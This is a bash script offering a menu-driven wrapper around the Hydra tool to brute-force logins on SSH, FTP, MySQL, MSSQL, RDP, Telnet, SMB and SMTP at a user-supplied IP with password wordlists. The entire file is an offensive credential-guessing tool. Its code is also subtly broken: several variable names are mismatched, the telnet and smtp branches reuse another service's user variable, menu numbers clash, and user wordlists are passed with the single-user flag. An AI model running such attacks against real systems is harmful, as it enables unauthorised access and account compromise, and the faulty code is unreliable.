HYDRA=/usr/bin/hydra
echo "Hydra Brute Force
=======================
"
if [ -f "$HYDRA" ]
then
echo "Options 
Option 1:ssh[1]
Option 2:ftp[2]
Option 3:mysql[3]
Option 4:mssql[4]
Option 5:rdp[5]
Option 6:telnet[6]
Option 7:smb[6]
Option 8:smtp[7]
"
read -p "Choice: " choice
read -p "IP: " ip
read -p "Wordlist location: " wordl
 
case $choice in

  1)
    echo  "SSH Bruteforce"
 read -p "Do you know the user(y=1/n=0): " intel
  if [ "$intel" -eq 1 ]
   then
   read -p "User: " user
   hydra -l $user -P $wordl ssh://$ip
  elif [ "$intel" -eq 0 ]
   then
   read -p "Users wordlist location: " user_loc 
   hydra -l $user_loc -P $wordl ssh://$ip
   fi
    ;;
  2)
    echo  "FTP Bruteforce"
read -p "Do you know the user(y=1/n=0): " intel_2
 if [ "$intel2" -eq 1 ]
  then
  read -p "User: " user_2
  hydra -l $user_2 -P $wordl ftp://$ip
 elif [ "$intel_2" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc2 
  hydra -l $user_loc2 -P $wordl ftp://$ip
  fi  
    ;;
  3)
    echo "MYSQL Bruteforce"
read -p "Do you know the user(y=1/n=0): " intel_3
 if [ "$intel3" -eq 1 ]
  then
  read -p "User: " user_3
  hydra -l $user_3 -P $wordl mysql://$ip
 elif [ "$intel_3" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc3 
  hydra -l $user_loc3 -P $wordl mysql://$ip
  fi  
    ;;
  4)
 echo "MSSQL BruteForce"
read -p "Do you know the user(y=1/n=0): " intel_4
 if [ "$intel4" -eq 1 ]
  then
  read -p "User: " user_4
  hydra -l $user_4 -P $wordl mssql://$ip
 elif [ "$intel_4" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc4 
  hydra -l $user_loc4 -P $wordl mssql://$ip
  fi  
    ;;
5)
 echo "RDP BruteForce"
read -p "Do you know the user(y=1/n=0): " intel_5
 if [ "$intel5" -eq 1 ]
  then
  read -p "User: " user_5
  hydra -l $user_5 -P $wordl rdp://$ip
 elif [ "$intel_5" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc5 
  hydra -l $user_loc5 -P $wordl rdp://$ip
fi
;;
6)
 echo "TELNET BruteForce"
read -p "Do you know the user(y=1/n=0): " intel_6
 if [ "$intel6" -eq 1 ]
  then
  read -p "User: " user_6
  hydra -l $user_4 -P $wordl telnet://$ip
 elif [ "$intel_6" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc6 
  hydra -l $user_loc4 -P $wordl telnet://$ip
fi
;;
7)
 echo "SMB BruteForce"
read -p "Do you know the user(y=1/n=0): " intel_7
 if [ "$intel7" -eq 1 ]
  then
  read -p "User: " user_7
  hydra -l $user_7 -P $wordl smb://$ip
 elif [ "$intel_7" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc7 
  hydra -l $user_loc7 -P $wordl smb://$ip
fi
;;

8)
 echo "SMTP BruteForce"
read -p "Do you know the user(y=1/n=0): " intel_8
 if [ "$intel8" -eq 1 ]
  then
  read -p "User: " user_8
  hydra -l $user_4 -P $wordl smtp://$ip
 elif [ "$intel_8" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc8 
  hydra -l $user_loc8 -P $wordl smtp://$ip
fi
;;
esac
 else
sudo apt update 
sudo apt install hydra
fi   
